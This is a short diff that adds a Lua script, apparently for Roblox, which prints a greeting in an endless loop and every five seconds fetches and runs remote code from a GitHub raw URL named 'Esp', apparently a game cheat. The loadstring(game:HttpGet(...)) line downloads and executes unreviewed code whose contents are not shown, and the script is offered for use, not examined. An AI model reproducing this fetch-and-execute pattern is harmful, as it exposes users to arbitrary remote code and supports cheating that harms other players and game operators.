@@ -1,0 +1,5 @@
+while true do
+print("hello")
+wait(5)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/RipperC3rvinion/E/main/Esp'),true))()
+end
